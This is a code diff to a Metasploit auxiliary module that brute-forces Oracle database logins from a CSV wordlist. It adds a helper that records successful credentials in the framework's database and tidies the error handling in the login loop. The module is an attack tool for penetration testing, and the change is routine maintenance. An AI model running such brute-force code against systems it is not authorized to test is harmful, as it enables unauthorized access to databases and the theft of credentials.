@@ -36,6 +36,32 @@ class Metasploit3 < Msf::Auxiliary
 
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
     return if not check_dependencies
 
@@ -44,27 +70,27 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Starting brute force on #{datastore['RHOST']}:#{datastore['RPORT']}...")
 
     fd = CSV.foreach(list) do |brute|
+      datastore['DBUSER'] = brute[2].downcase
+      datastore['DBPASS'] = brute[3].downcase
 
-    datastore['DBUSER'] = brute[2].downcase
-    datastore['DBPASS'] = brute[3].downcase
-
-    begin
-      connect
-      disconnect
-    rescue ::OCIError => e
-      else
-        if (not e)
-          report_auth_info(
-            :host  => "#{datastore['RHOST']}",
-            :port  => "#{datastore['RPORT']}",
-            :sname => 'oracle',
-            :user  => "#{datastore['SID']}/#{datastore['DBUSER']}",
-            :pass  => "#{datastore['DBPASS']}",
-            :active => true
-          )
-          print_status("Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}")
+      begin
+        connect
+        disconnect
+      rescue ::OCIError => e
+        if e.to_s =~ /^ORA-12170:\s/
+          print_error("#{datastore['RHOST']}:#{datastore['RPORT']} Connection timed out")
+          break
         end
-    end
+      else
+        report_cred(
+          ip: datastore['RHOST'],
+          port: datastore['RPORT'],
+          service_name: 'oracle',
+          user: "#{datastore['SID']}/#{datastore['DBUSER']}",
+          password: datastore['DBPASS']
+        )
+        print_status("Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}")
+      end
     end
   end
 end
